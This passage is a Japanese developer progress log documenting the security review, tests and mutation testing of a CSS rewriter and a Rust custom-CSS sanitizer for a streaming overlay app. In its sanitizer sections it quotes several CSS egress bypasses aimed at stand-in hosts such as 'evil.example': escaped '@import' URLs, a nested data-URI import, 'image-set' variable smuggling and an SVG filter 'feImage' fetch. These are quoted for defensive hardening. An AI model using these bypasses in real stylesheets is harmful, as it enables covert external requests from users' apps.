   ルートに **`sd-overlay` は付かない**こと。見た目が実装前と同じで、**046c の縮小フィットも従来どおり効く**
   （290 字超の長文を固定して確認）。

### security-review＋品質レビュー（厚い版）とその対応（2026-08-05）

軽レビュー（修正必須 0 件）とは別に、**「経路を作る側」という性質**と**文字列置換で他人の CSS を
書き換える壊れ方の分かりにくさ**を理由に、厚いレビューを実施した。**総合判定＝問題なし・修正必須 0 件。**

**実測で確認した不変条件**（読むだけでは走査型スキャナのバグは見つからないため、敵対的入力を実際に通した）:

- **敵対的入力 約60 本で `url()` が全ケースでバイト一致保存**。内訳＝`@import url(引用符なし)` ／
  `@import "…" screen and (…)` ／ URL 内に `{}` を含む `@import` ／ `@font-face{src:url()}` ／
  `image-set()` ／ `cursor:url()` ／ `list-style-image` ／ URL 内に `.chat-line__message` を literal で含むもの ／
  `@charset` ／ `@namespace … url(…)` ／ **`@layer a,b;`（文）と `@layer a{}`（ブロック）の区別** ／
  `@supports{@media{}}` ／ `@media` 二重ネスト ／ `@keyframes` ／ `@scope` ／ `@container` ／
  CSS Nesting 内の `url()` ／ **波括弧を含むカスタムプロパティ `--foo:{color:red}`** ／
  文字列中の `{` `}` ／ エスケープ引用符 ／ 改行と EOF での不正終端 ／ `}` や `"` を含むコメント ／
  閉じないコメント ／ 属性セレクタ内の文字列 ／ BOM ／ NUL ／ 制御文字 ／ `{` 単独 ／ `}`×500 ／
  5000 段ネスト ／ `@{…}`。**throw ゼロ・ハングゼロ。**
- **ReDoS なし**（実測）: 248KB の現実的入力 **12.3ms** ／ リテラル直後に空白 10 万文字 **4.9ms** ／
  535KB の病的入力 **8.6ms** ／ `>` 結合子 5 万個 **0.8ms**。`(?:\s*>\s*|\s+)` に量化子が掛かっておらず
  前後をリテラルで挟んであるため入れ子量化子の爆発が起きない。→ **060a 側に入力上限が無いのは妥当**で、
  060b の 256KB は十分な余裕。
- **無限ループが構造的に不可能**（全分岐が `i` を必ず前進させ、`skipString` は常に開始位置より大きい値を返す）。

**適用した修正（3 件）**

1. **Q-1（High）— 「部分変換 → 黙って効かない → しかも `rewritten` が加算される」の是正。**
   実測で、実在テーマで最も多い書き方が軒並みこの状態だった:
   `…renderer #timestamp` → `.sd-comment #timestamp`（rewritten=1・警告なし・当たらない）。
   `#chat-badges` / `#author-photo` / `> #content > #message` / `[author-type="owner"]` も同型。
   → `FOREIGN_ID_NAMES`（`#message` / `#author-name` / `#author-photo` / `#img` / `#chat-badges` /
   `#timestamp` / `#purchase-amount`）を **`unmatched` の警告専用パスにだけ**追加した。
   ⚠⚠ **「変換しない理由」と「警告しない理由」は別物**という気づきが要点。裸 id を**変換表**に入れないのは
   正しい（ユーザー自身の `#img` を壊しうる）が、**警告**にその理屈は移らない——**ユーザーは StreamDock の
   DOM に id を作れず**、実在する id は `index.html` の `#root` ただ 1 つだから、裸 id は**証明可能に死んでいる**。
   その前提を**静的ガード (10-g)**（オーバーレイの 3 ファイルに `id=` を書かせない）で固定した。
   ⚠ 総称的な id（`#content` / `#card` / `#header` / `#menu`）は**意図的に入れていない**（将来 StreamDock が
   その名前を使うと誤検知に転ぶため）＝**既知の取りこぼし**として `FOREIGN_ID_NAMES` に再修正トリガー付きで記録。
2. **Q-2（Medium）— ガードの相互参照が 3 か所ずれていた。** このプロジェクトの安全モデルは
   「コメントから機械検査へ辿れること」に依存しているので実質的な劣化だった。
   `cssCompat.ts` の冪等性 (10-d)→**(10-c)**、`to:` 突き合わせ (10-a)→**(10-b)**、
   `OverlayComment.module.css` のフォールバック固定 (10-c)→**(10-e)/(10-f)**。
3. **Q-3（Medium）— `--sd-comment-gap` は指定値の 2 倍効く。** `margin-block` は上下両方に効き、
   flex アイテム同士の margin は相殺されないため、実距離は `6px（.list の gap）＋ 2 × 指定値`。
   コメントは「加算」までしか書いておらず 2 倍に触れていなかった。→ CSS コメントと上の実機確認手順に明記。
   **意匠不変そのものは保たれている**ことを確認済み（`li` に UA 既定 margin は無く、`theme.css` にも
   `li`/`ul` の margin リセットは無く、`.list` は flex なので margin 相殺も起きない＝`0px` は真に no-op）。

⚠ **この修正中、ガード (10-e) が自分の編集ミスを実際に検出した**（コメントを差し替えた際に元コメントの
後半が `*/` の外へ取り残され、`margin-block` の宣言が読めなくなった）。**「意匠が動いたことの検知」を
狙って置いたガードが、意匠と関係ない構文崩れも掴んだ**——(10-e) の費用対効果の実証例として記録しておく。

**コメントのみで残した指摘（修正不要）**

- **Q-4（Low）**: `:not()` の中では変換が意味を反転させうる（`.sd-comment:not(.chat-line__message)` →
  `.sd-comment:not(.sd-comment)`＝自己否定で何にも当たらない）。トークン単位の置換である以上
  「効かなくする」ではなく「壊す」唯一のケース。実例が考えにくいので据え置き、`rewriteSelectors` の
  docstring に再修正トリガー付きで記録。
- **Q-5（Low）**: `FOREIGN_SELECTOR_RE` は `compileFrom()` と違って CSS エスケープを完全には解釈しない。
  `.a\.chat-line__message` は**変換されない（安全側・正しい）**が `unmatched` には載る＝ユーザー自身の
  クラスに「効きません」と誤警告しうる。実害は警告文の誤りに限られるので据え置き。
- **Q-6（Low）**: 大文字セレクタ（`YT-LIVE-CHAT-…`）は変換も警告もされない。HTML では型セレクタは
  大小無視なので正当な入力だが、`i` を付けると誤検知が増えるため据え置き。
- **Q-7（Low）**: CSS Nesting は `unmatched` にも載らない＝Q-1 と同じバケツ。**既存の docstring に
  記載済み**（`scanPreludes` の「⚠ CSS Nesting（`&`）は非対応」）だったので追記せず。

**060b / 060d への申し送り（`docs/task-board.md` と `docs/security.md` に転記済み）**

- **S-1（060d 必須）**: `unmatched` は**要素数も 1 要素の長さも入力次第で無制限**（実測: 2 万件 ／
  引用符なし属性値で 5 万文字の 1 トークン・改行と制御文字を含む）。React が escape するので XSS は
  無いが、**件数と 1 件あたりの長さの両方を clamp**すること（055b review S-5 と同型）。
  なお**引用符付き**（`[data-a-target="…"]`）は走査が文字列を除外するので載らない＝設計の副産物として
  安全側に倒れている。`RewriteResult.unmatched` の docstring とテストで固定した。
- **S-2**: 順序制約（**060b より先に 060d を実装してはならない**）が task-board / progress.md /
  `cssCompat.ts` の JSDoc という**レビュアが読む義務のない場所**にしか無かった。
  → **`docs/security.md` の「レビュー必須条件」に項目を新設**した（レビュアが必ず読む場所へ移した）。
  ⚠ 「`cssCompat` の import 元がテスト以外に無い」ガードを**作らない**判断は維持（060d が正しく実装された
  瞬間に落ちる＝(5-b) が戒めた「正しいコードで fail する検査」そのものになるため）。**落ちない場所に置く**のが解。
- **S-3（060b 必須）**: §1 の例外節を書くとき、**060a が作った「的」の存在に必ず触れること**。
  安定クラス契約によりユーザー CSS はオーバーレイの全要素を文書化された名前で確定的に狙える＝
  **`url()` 除去は多層防御の 1 枚ではなく唯一の壁**。加えて `.sd-comment-icon` は
  **036a の「webview が踏むのは data URI のみ」を背負っている要素そのもの**で、除去に穴があると
  036a の不変条件がその要素の上で破れる。
- **S-4**: **CSP は安い代替にならない**。`img-src 'self' data:` を効かせれば構造的に塞げるが、
  **Tauri v2 の `csp` はアプリ全体に 1 つ**で `comment-viewer` 窓は Twitch / YouTube / VOICEVOX / OBS への
  `connect-src` を要する＝オーバーレイ窓だけに効かせられない。**060b のサニタイザが load-bearing**。

**`docs/security.md` の扱い（S-5）**: 方針・例外節を変更しなかった判断は**妥当**（新規通信ゼロ・
新規権限ゼロ・新規永続化ゼロ）。**軽レビュー指定も妥当**で、059a の先例とは性質が違う——059a は
列挙項目である `src-tauri/src/audio/` の本番コードに**実際に差分を出しながら**下位条件で自分を免除した
誤りだったが、060a は列挙項目のどの面にも差分がない。追加したのは S-2 の**注入する側**に対する条件のみ。

**検証**: `typecheck` ✅ ／ `lint` ✅ ／ `test` ✅ **815 passed / 39 files**（+6・CSS guard OK ／
Version sync OK）／ `cargo check` ✅（Rust 無改変）。

### レビュー後のテスト補強（2026-08-05・+55 件 → 870 passed / 39 files）

厚いレビューで**手元では通したが常設化していなかった**検証と、レビュー中に見つかった
**ユニットテストの穴 3 つ**を埋めた。ミューテーション 6 種で実効性を確認済み。

**(1) `cssCompat.test.ts`（+49）—— 走査型スキャナの敵対的入力を常設化**

レビューで約60 本の敵対的入力を通したが、リポジトリに残っていたのは数本だけだった。
**本 module 最大のセキュリティ不変条件**（「`@import` と `url()` に触らない」＝060b / 060c との責務分離）は
**読むだけでは守れない**ので、4 つの describe として常設した。

- **`url()` が 1 バイトも変わらない**（13 ケース・出現順ごと比較）: 引用符なし `@import` ／ URL 内の `{}` ／
  `@font-face` の `src` ／ `image-set()` ／ `cursor:url()` ／ `list-style-image` ／ `@namespace` ／
  波括弧入りカスタムプロパティ ／ CSS Nesting 内の url ／ **引用符なしで url の中身がセレクタと同じ文字列**
  （⚠ これが「宣言ブロックの中をセレクタとして見ない」ことを最も強く問う 1 本＝文字列スキップに守られない）
- **変換対象が無い CSS は恒等変換**（20 ケース）: `@charset` ／ `@layer` 文とブロック ／ `@supports>@media` ／
  `@media` 二重ネスト ／ `@container` ／ `@scope` ／ `@keyframes` の `from`/`to` ／ 文字列中の `{`・`}`・
  エスケープ引用符・不正終端 ／ 閉じないコメント ／ 属性セレクタ内の文字列 ／ 大文字セレクタ ／
  CSS エスケープ ／ **CSS Nesting**
- **敵対的・壊れた入力で throw しない**（11 ケース）: `{` 単独 ／ `}`×500 ／ 2000 段ネスト ／ BOM ／ NUL ／
  制御文字 ／ 末尾バックスラッシュ ／ 名前無しアットルール ／ プレリュード内セミコロン
- **計算量の回帰ガード**（4 ケース）: 空白 10 万文字 ／ リテラル＋空白の 1000 回反復 ／ `>` 5 万個 ／
  256KB 相当。⚠ 閾値は CI の遅さを見込んで 3 秒と大きく取り、**指数爆発だけを捕まえる**
  （実測は 5〜15ms）。`(?:\s*>\s*|\s+)` に量化子を入れ子にする変更を入れると落ちる。

**(2) `CommentList.test.tsx`（+1）—— 安定クラスは「併記」であって「置換」ではない**

⚠⚠ **レビューでも見落としていた穴**。`className={\`${overlayStyles.item} sd-comment\`}` を
`className="sd-comment"` に書き換える変異は、**意匠を全部消すのに 060a の契約テストは全部緑のまま通る**
（契約テストは `.sd-comment` を引くだけだから）。ガード (10-a) も「名前が消えていないこと」しか見ない。
→ chat / 課金の両分岐で CSS モジュールのクラス（`item` / `card` / `tier6` / `bubble` / `cardBody` /
`amountBadge` / `name` / `text` / `icon` / `source`）が**残っていること**を表明した。
⚠ 執筆時に OBS 側のティアクラスを本体 UI 側の `toneT6` と書いて落ちた——**正しくは 043c 由来の `tier6`**
（`monetaryTone.ts` が 2 つの命名を並べている理由がこれ）。テストを緩めず実装側の名前に合わせた。

**(3) `PinnedOverlayApp.test.tsx`（+3）—— 固定窓での契約の出方（ランタイム）**

ガード (10-d) は `PinnedOverlayApp.tsx` の**ソース文字列**しか見ないので、「実際に DOM へ出る／出ない」は
ここが唯一の担保（(10) 冒頭が定めた役割分担のとおり）。安定クラスと data 属性は**出る**こと、
**窓ルートの `sd-overlay` は付かない**こと（046c の `applyFitScale` が `.root` を排他所有）、
課金の固定コメントでも `sd-comment-tip` / `data-sd-tone` が出ることを表明した。

**ミューテーション結果（6 種すべてレッドを実測）**

| 変異 | 殺したもの |
|---|---|
| 安定クラスで CSS モジュールを置換（意匠が消える） | (2) の併記テスト |
| 固定窓に `sd-overlay` を付ける | (3) のテスト ＋ ガード (10-d) |
| 文字列スキップを外す | `url()` 保存テスト |
| コメントスキップを外す | 恒等変換テスト |
| `;` によるアットルール文の破棄を外す | 4 件（`@charset` / `@layer` / `@namespace` / `@import`） |
| **通常規則の中身もセレクタとして走査する** | **CSS Nesting の恒等変換テスト（後述）** |

⚠⚠ **最後の 1 つは初回のミューテーションで生存し、テストを 2 本足して殺した。**
「通常規則の中身もセレクタとして走査する」＝**ネスト対応を素朴に足すとこうなる**変異で、
url() テストも既存の恒等変換テストも**すべて緑のまま通った**（変換は `{` の直前のテキストにしか起きないため、
波括弧を含まない宣言ブロックでは観測できない）。CSS Nesting のケースを恒等変換の表に足して初めて落ちる。
**この変異は同時に宣言テキストを走査対象にする＝060b の `url()` 除去と二重処理になる入口**なので、
ネスト対応を足すときは「宣言テキストを走査しない」ことを別途担保してからにすること
（テスト側にもその旨をコメントで残した）。

## 060b カスタム CSS 取り込み基盤（Rust・保存/検証/レジストリ）（2026-08-05）

`overlay_theme` モジュール（**5 分割**）＋ `overlay_themes` テーブル ＋ 5 コマンド ＋
`comment-viewer.json` への `dialog:allow-open` 1 件。**新規依存ゼロ・`tauri.conf.json` 差分ゼロ・`csp: null` 不変。**

### 着手前に確定した判断（①〜⑫・本人回答）

| # | 論点 | 決定 | 根拠 |
| --- | --- | --- | --- |
| ① | 外部 URL 除去の方式 | **allow-list ＋ 1 点だけ fail-closed** | 下記「② deny-list を捨てた理由」 |
| ② | 除去 URL の受け渡し | `import` の**戻り値**に載せる。**DB には持たない**。生 CSS を返す read コマンドは**作らない** | 060c は「取り込み時に 1 回・毎回の同意」なので永続化不要。§9 的にも軽い |
| ③ | binding 出力先 | `src/features/comment-viewer/bindings/`（新ディレクトリを作らない） | `check:bindings` の列挙がハードコードで、新規ディレクトリは**ドリフトを検出できない**。`audio` / `obs_config` と同じ場所という前例もある＝ **`package.json` 差分ゼロ** |
| ④ | `name` の UNIQUE | **張らない**（判断は `repository::init` の doc コメントに記載） | テーマは「2 つ入れて見比べる」もの。UNIQUE 違反は `StorageFailed` へ潰れて**原因の分からないエラー**になる。重複警告は 060d の UI で |
| ⑤ | サイズ上限 | **256KB** | 060a 実測（248KB の現実的入力 12.3ms／535KB の病的入力 8.6ms）。実チャット CSS の 100 倍近い余裕 |
| ⑤ | `name` | trim・空拒否・`reject_control_chars`・**80 文字** | 一覧 1 行に収まる長さ |
| ⑤ | 本文の制御文字 | C0 のうち **`\t \n \r \x0C` 以外**と DEL を拒否 | ⚠ `reject_control_chars` は使えない（`char::is_control` が改行も弾く＝ CSS 本文が全滅する）。**`name` 用と本文用で規則が違う**ことをコメントに明記 |
| ⑤ | 件数上限 | **200 件** | 取り込みコマンドは**全 4 窓から呼べる**ので、無制限にディスクが増える経路を構造側で塞ぐ |
| ⑥ | `path` 検証 | trim・空拒否・制御文字拒否・`.css`（大小無視）・`is_file()`・サイズ（読む前／読んだ後の 2 回） | trim は `tools::service` に合わせた（帰結＝前後空白入りのファイル名は取り込めない） |
| ⑥ | `canonicalize` / シンボリックリンク拒否 | **どちらもやらない**（理由をコメントに残す） | 保存先の組み立てに元パスが影響しない以上 canonicalize に防げるものが無い。リンク越しに読めるのはユーザーが元々読めるファイルだけ＝**特権境界を跨がない** |
| ⑦ | 失敗時の後始末 | **書き込み → INSERT** の順。INSERT 失敗でファイルを掃除。削除は **DB 行が先** | 残るものの質が違う——孤児**ファイル**は不可視で無害、孤児**DB 行**は一覧に出て開けない**可視の故障** |
| ⑦ | `themes/` の作成 | `lib.rs` の `setup` ではなく `service` の保存ヘルパで `create_dir_all`（冪等） | 実行中にディレクトリを消されても復旧できる。`lib.rs` の差分も `repository::init` の 1 行だけで済む |
| ⑧ | `get_overlay_theme_css` が全 4 窓から呼べる | **受容**（security.md「Capabilities 方針」に記録） | read-only／パスを受け取らない（2 段検証）／256KB 上限／**3 窓が実際に必要とする**（注入先・プレビュー・将来の固定窓） |
| ⑨ | エラーコード | **新設しない**（既存 4 つ） | `error.rs` の方針は「ユーザーが取れる行動が違うときだけ分ける」。区別は**作者が書いた固定文言**で行う |
| — | モジュール分割 | **5 分割**（タスクファイルの「4 分割」から意図的に逸脱・`sanitize.rs` を独立） | サニタイザは唯一の壁なので専用の doc・テスト・ミューテーション対象を持つべき。sidecar の `host-guard.ts` と同じ作法 |
| — | 060c 用 text 版コマンド | **共通コア `store_sanitized_css` だけ作る**（コマンドは 060c で足す） | 検証の分裂は防ぎつつ、**呼び手のいないコマンドを全 4 窓へ露出しない**（060c は実装しない判断も残る） |

### ⚠⚠ deny-list を捨てた理由 —— CSS エスケープで自明に破れる

タスクファイルの当初案「`http…` / `//…` に見えるものを除去する」は**そのままでは成立しない**。

```css
@import "\68ttps://evil.example/a.css";   /* \68 → h。復元すると https:// */
@import "htt\
ps://evil.example/a.css";                 /* 文字列内の \改行 は行継続として消える */
```

「URL が何に見えるか」で判定する方式は、判定前に CSS のエスケープを完全に復元する必要がある（＝結局パーサが要る）
うえに、**見落としが「残す側」＝危険側に倒れる**。allow-list ではこれが反転し、生き残るには
「**エスケープを 1 つも含まず**、リテラルで `data:` から始まる」必要がある＝**難読化された時点で自動的に除去される**。

### ⚠⚠ 設計中に見つけた、タスクファイルに無い 3 つの穴

1. **`@import url("data:text/css,@import url(https://evil)")`** —— **入れ子の `@import` をブラウザが辿る**＝ egress。
   → **`data:` の許可は宣言値の `url()` 位置に限る**（`@import` は無条件で除去）。
2. **`image-set()` は裸の文字列を URL として扱う唯一の実装済み関数**で、`var()` 置換の的になる:
   ```css
   --a: "https://evil.example/x.png";        /* url() でも @import でもない、ただの文字列 */
   background-image: image-set(var(--a) 1x); /* 置換後に URL 位置へ入る＝ egress */
   ```
   `url()` だけを見る実装はこれを素通しする。→ **`image-set(` を含む宣言を中身に関わらず落とす**。
   カスタムプロパティ側へ隠す形（`--a: image-set(…)`）も同時に閉じる。
   ⚠ `var(--a)var(--b)` でトークンを継ぎ接ぎする形は、CSS の置換仕様が再トークン化を禁じているため成立しない。
3. **`data:` にフラグメントが付く形**（security-review で発見・下記）。

### 除去規則（確定）

| 位置 | 動作 |
| --- | --- |
| `@import`（`url()` 形・素の文字列形・**`data:` 形も**） | **無条件で文全体を除去**＋計数＋宛先を戻り値へ記録 |
| `@namespace` | 文全体を除去（取得はされないが、残すと「生きた `url(http…)` があってよい例外」ができ、残留検証が弱い不変条件に退化する） |
| 宣言値の `url(…)` | **エスケープ無し・制御文字無し・`#` 無し・ASCII 大小無視で `data:` 始まり**のときだけ残す。それ以外は**宣言まるごと除去** |
| `image-set()` / `-webkit-image-set()` / `image()` | **中身に関わらず宣言まるごと除去** |
| ブロック系アットルールの**プレリュード**内の url | **取り込み自体を拒否**（fail-closed） |
| 未終端の文字列 / コメント / `url(`、深すぎる入れ子 | 除去または拒否（**「残す」判断を絶対にしない**） |

- **相対 URL（`url(/x.png)`）は egress ではない**（webview のオリジンは Tauri のカスタムプロトコル）。
  それでも allow-list により除去される＝規則を 1 本に保つため。⚠ **`url(//evil/x.png)`（プロトコル相対）は
  Windows では実 egress**（オリジンが `http:`）なので、「相対だから安全」と読み替えないこと。
- **`url(#frag)` も除去する**。egress にはならないが、ユーザー CSS からオーバーレイ DOM に SVG を持ち込む手段が無く
  **実用上死んでいる**ため、許可形を `data:` 1 つに絞って security.md の字面と揃えた。

### アルゴリズムと限界

- **正規表現を使わない手書きトークナイザ**（`sanitize.rs`・約 400 行・**新規依存ゼロ**）。
  コメント／文字列（`\` エスケープ・16 進エスケープ・**行継続**）／`url()` の引用符あり・なし／
  アットルールのプレリュードとブロックを CSS 仕様に沿って読む。
  **識別子はアンエスケープしてから比較する**のが迂回対策の中核（`\75 rl(` / `u\72 l(` / `\000075rl(` / `@\69 mport`）。
- **中身は「`;` で終わる文」と「`{` で始まるブロック」の列として一様に扱う**。この一様化のおかげで
  `@media` / `@supports` / `@font-face` / `@keyframes` / CSS Nesting / **波括弧を値に持つカスタムプロパティ**
  （`--foo: { … }`）を個別に知らなくても正しく走査できる。
- **削除は「残す部分だけを写す」方式**（削除区間の補集合を書き出す）＝位置ずれのバグが構造的に起きない。
- **残留検証**（post-condition）: 出力をもう一度走査し、許可形以外の url 位置が残っていたら**拒否**する。
  ⚠ 同じトークナイザを使うので**トークナイザ自体のバグは検出できない**が、
  **ブロック構造の解釈がずれた場合は「url が漏れる」ではなく「取り込みが拒否される」へ劣化する**。
- **無限ループが構造的に不可能**（全分岐が index を必ず前進させる）。入れ子は 64 段で拒否（スタックオーバーフロー＝
  abort を作らない）。**256KB の入力で線形**（回帰ガードを常設・閾値は指数爆発だけを捕まえる 3 秒）。
- ⚠ **既知の限界**: `url(data:image/svg+xml,…)` の SVG 内部は解釈しない。**フラグメント無し**の SVG data URI は
  「画像としてしか読まれない」＝ secure static mode で外部参照が仕様上禁止される、というブラウザ側の保証に依存している。
  再修正トリガー＝その保証が破れる CVE が出たら `data:` の MIME 許可リストへ踏み込む。

### 実サンプル CSS での実測（依頼者の 2 本・`cssCompat.test.ts` から逐語で流用）

| サンプル | `strippedCount` | `strippedImportUrls` | 出力 |
| --- | --- | --- | --- |
| YouTube | **1** | `["https://ruri.info/tool/css/midashi1Comment.css"]` | 先頭の `@import` 行だけが消え、**残りはバイト単位で無改変** |
| Twitch | **1** | `["https://ruri.info/tool/css/twmidashi1Comment.css"]` | 同上 |

冪等（2 周目は `strippedCount=0`・出力一致）も固定した。⚠ 第三者資産（ruri.info の CSS）は
**リポジトリに一切コピーしていない**（060a と同じ扱い・URL のみ）。

### ⚠⚠ 実機での期待値 —— 「見た目がほぼ変わらない」が正しい

060a が実サンプルから確認したとおり、**このサンプル 2 本には意匠がほとんど無い**（中身は外部 `@import` 1 行＋
書体指定＋`--txtcolor`）。したがって:

- **060b 単体では見た目は 1px も変わらない**（注入は 060d）。
- **060d まで作っても「書体しか効かない」**——吹き出しの意匠は**丸ごと除去した `@import` の中**にある。
- **060c で初めて意匠が出る。** ＝ **これは仕様どおりで、バグではない。**

### security-review（2026-08-05・判定「軽微な懸念あり」・**指摘 3 件は実装へ反映済み**）

読むだけでは走査型スキャナの穴は見つからないので、**敵対的入力 20 本を実際に通して出力を目視**した
（055e の教訓＝自分のガードの主張を裏返す変異だけでは、ガードが見ていない領域の穴は見つからない）。

**R-1（Medium・適用済み）— `data:` にフラグメントが付くと SVG を「リソース文書」として読ませられる。**
`data:` を許す根拠は「SVG を**画像として**読む経路は secure static mode になり外部参照が仕様上禁止される」ことだが、
**`filter:` / `mask:` / `clip-path:` は SVG を画像ではなくリソース文書として読む**ので、その保証が及ぶとは限らない。
実測で以下が**素通りしていた**:

```css
.a{ filter: url("data:image/svg+xml,<svg><filter id='f'><feImage href='https://evil/x'/></filter></svg>#f") }
```

→ **リソース参照は対象要素を指すために必ずフラグメントを要する**ので、**`#` を含む `data:` を落とす**ことで
この経路がまとめて閉じる。⚠ 正当な損失はほぼゼロ（data URI 本体の生の `#` はフラグメント扱いになってそもそも壊れるので
実在の SVG data URI は `%23` を使う。base64 の文字集合に `#` は無い）。**フラグメント無しの SVG data URI は残す**
（消しすぎない担保もテストで固定）。

**R-2（Low・適用済み）— 引用符なし `url-token` の中の引用符。**
CSS 仕様では bad-url-token になりブラウザは宣言ごと捨てるが、実装は普通の文字として飲み込んでいた。
`url(data:x")url("https://evil")` のような入力で**ブラウザとトークン境界の解釈が分かれる余地**が残るので、
**常に「壊れている」側へ倒す**ようにした（＝必ず除去側になる）。

**R-3（Medium・適用済み・可用性）— 取り込みが DB ロックを跨いでファイル I/O をしていた。**
`path` はユーザーが dialog で選んだ場所＝**ネットワークボリューム上にありうる**。読み込みを `db.lock()` の
内側で行っていたため、応答しないボリュームを掴むと**アプリ全体の DB コマンド（コメント記録・プリセット起動・ログ）が
まとめて止まる**構造だった。→ **読み込みをロックの外へ出した**（`read_import_source` → ロック取得 → `import_local_source`）。
この順序は契約テストで固定してある。
⚠ `get_overlay_theme_css` は同じ形にしていない——読むのは `app_data_dir`（常にローカル）配下の ≤256KB で、
**パス解決と読み取りを 1 つの関数に閉じておくほうがセキュリティ不変条件として強い**ため（意図的な非対称）。

**確認して問題なしとしたもの**: 外部通信ゼロ（契約テストが `reqwest` 等の出現を止めている）／
汎用の書き込み・任意パス読み取りコマンドが生えていない（コマンド数・`path: String` の出現回数を固定）／
`name` にトラバーサル形を入れても管理ディレクトリ外へ出ない（`is_managed_file_name` の直接テスト＋実 I/O テスト）／
ログにも `AppError` にも CSS 本文・フルパス・除去 URL が出ない（マーカー文字列で実測）／
capability は `dialog:allow-open` 1 件のみ／`</style>` を含む CSS は**そのまま保存する**（正当な CSS なので除去しない。
注入経路を `textContent` に限る責務は 060d 側で、security.md のレビュー必須条件に既記載）。

### テスト（**+65 件 → Rust 222 passed**。内訳＝`sanitize` 28 ／ `service` 26〔仕様 18 ＋ 契約 8〕／ `repository` 8 ／ ts-rs の binding 出力 3）

- **`sanitize.rs`（28 件）**: 実サンプル 2 本の出力を全文固定／`data:` が全ての値位置で残る（バイト一致）／
  `@import` が全形で消える（`data:` 形を含む）／外部・相対・`#frag` の `url()` が宣言ごと消える／
  `image-set` が中身に関わらず消える／**`var()` 密輸**／カスタムプロパティ（`url` 入りは消え、`{}` 入りは残る）／
  **迂回**（CSS エスケープ 3 種・大文字・コメント挿入・改行・文字列内の行継続・エスケープされた `data:`）／
  **`#` 付き `data:`**／**引用符なし url-token 内の引用符**／プレリュード url の拒否（**専用の診断文言まで固定**）／
  入れ子上限／恒等変換 17 ケース（`@charset` / `@layer` 文とブロック / `@supports>@media` / `@keyframes` /
  `@container` / CSS Nesting / **宣言の途中のコメント** / 文字列中の `}` / 属性セレクタ）／
  敵対的入力 21 本で panic もハングもしない／冪等 5 形／**256KB の計算量ガード**／clamp／エラーが入力を持ち帰らない。
- **`service.rs` の仕様テスト（18 件）**: `is_managed_file_name` の 16 ケース／`name` の検証（**U+0085 が Rust では弾かれ JS 正規表現では通る**
  ことをコメント付きで固定）／本文の制御文字（空白 4 種は通す）／BOM／サイズ境界／パス検証（拡張子・大小・
  ディレクトリ・不在・サイズ）／バイナリ拒否／**エラーがフルパスを出さずファイル名だけ出す**／
  取り込みが `<uuid>.css` を 1 つだけ作る（元ファイル名もテーマ名も現れない）／**`../evil` 等 5 種の名前で外へ出ない**／
  削除がファイル実体も消す・二重削除・ファイルが先に消えていても成功／不正 id は disk に触れず NotFound／
  件数上限／**拒否時に孤児が残らない**／**INSERT 失敗時に孤児ファイルが残らない**（トリガーで INSERT だけ失敗させる）。
- **契約テスト（8 件）**: コマンド数 5・`async fn` 1 本・`path: String` の出現 1 回・`content`/`css`/`bytes`/`data` を
  受け取らない／`app_data_dir()` と `join(THEMES_DIR)` と `dir.join(file_name)` が各 1 か所／
  **検証が実際に呼ばれている**（`is_managed_file_name` / `sanitize_css` / 各 validate / 残留検証の**存在**を固定）／
  `cssCompat` を再実装・参照していない／HTTP クライアントが無い／**読み込みが DB ロックより前**／
  本番ロジック 5 ファイルに panic 経路ゼロ／ファイル数の固定。
- **`repository.rs`（8 件）**: `init` 冪等／往復／**同名を許す**（UNIQUE を足した変更で落ちる）／新しい順／
  `update_name`／二重削除／未知の `origin` が `Local` へ劣化／`snapshot` の往復。

### ミューテーション（**31 種すべて KILLED**。うち 4 種はテストを足して初めて殺せた＝実際の穴）

| 変異 | 結果 |
| --- | --- |
| allow-list を素通し／識別子のエスケープを復元しない／`url` を大小区別で比較／`@import` の素の文字列形を見ない／文字列の行継続で `has_escape` を立てない／引用符なし url-token を `data:` 扱いで通す／`image-set` の無条件除去をやめる／`@import` を無条件除去しない／`-webkit-image-set` を判定表から外す／文字列スキップを外す／削除範囲から `;` を外す／残留検証から `url()` の検査を落とす／clamp 2 種を外す | **KILLED** |
| 保存ファイル名を `name` 由来にする／サイズ上限の比較を反転／`managed_path` の検証を外す／保存経路がサニタイザを通らない／`name` と本文の制御文字チェックを外す／件数上限を外す／`delete` がファイルを消さない／入れ子上限を外す／`data:` の `#` 拒否を外す／引用符を普通の文字にする／読み込みを DB ロックの内側へ戻す | **KILLED** |
| ⚠ **プレリュード url の fail-closed を外す** | 初回**生存** → テストを補強して KILLED |
| ⚠ **INSERT 失敗時の孤児ファイル掃除を外す** | 初回**生存** → トリガーで INSERT を失敗させるテストを新設して KILLED |
| ⚠ **`url(` 直後の空白スキップを外す** | 初回**生存** → `url( "data:…" )` が残る担保を新設して KILLED |
| ⚠ **本文ループのコメントスキップを外す** | 初回**生存** → **宣言の途中**のコメントを恒等変換の表に足して KILLED |

⚠ **「プレリュード url の fail-closed を外す」が生存したのは、実は 2 層が本当に冗長だったから**——
プレリュードは削除対象にならないので url が出力に残り、**残留検証が拾って拒否する**。
それでもこの経路を残すのは**ユーザーに出る文言が変わる**から（「@media などの条件部分に外部参照が…」と
言えるのはこちらだけ）。テストは診断文言まで照合するようにして、その品質が静かに失われる変更を止めた。

⚠ **「本文ループのコメントスキップ」が最初の 4 ケースで殺せなかった理由**は、**文の先頭のコメントは
`skip_ws_and_comments` が先に食ってしまう**ため。`.a{/*…*/color:red}` では観測できず、
`.a{color:/*…*/red}` で初めて落ちる。**同じ構文要素でも位置を変えないと検査が空振りする**という
060a の「長い順ソートが実質空振りだった」と同型の事故。

### 変更ファイル

- **新規**: `src-tauri/src/overlay_theme/{mod,commands,service,sanitize,repository,model}.rs`
- **変更**: `src-tauri/src/lib.rs`（`mod` 1 行 ＋ `repository::init` 1 行 ＋ `generate_handler!` 5 行）／
  `src-tauri/capabilities/comment-viewer.json`（**`dialog:allow-open` 1 件のみ**）
- **生成**: `src/features/comment-viewer/bindings/OverlayThemeRecord.ts` / `OverlayThemeOrigin.ts` / `OverlayThemeImportResult.ts`
- **docs**: `security.md`（§5 例外節を新設＝**055d に続き 2 回目** ／ Capabilities 方針 ／ ## CSP方針 ／ §10）／
  `progress.md`（本節）／`task-board.md`／`tasks/060b-*.md`

### ゼロ拡大の実測（すべて差分ゼロを確認）

`tauri.conf.json` ／ `apps/comment-sidecar/` ／ `.github/` ／ `Cargo.toml` ／ `Cargo.lock` ／
`apps/desktop/package.json` ／ `pnpm-lock.yaml` ／ ルート `package.json`（**新規依存ゼロ**）／
`cssCompat.ts` ／ `CommentList.tsx` ／ `OverlayComment.module.css`（**060a の成果物は無改変**）／
`default.json` ／ `comment-overlay.json` ／ `pinned-overlay.json`。

### 検証

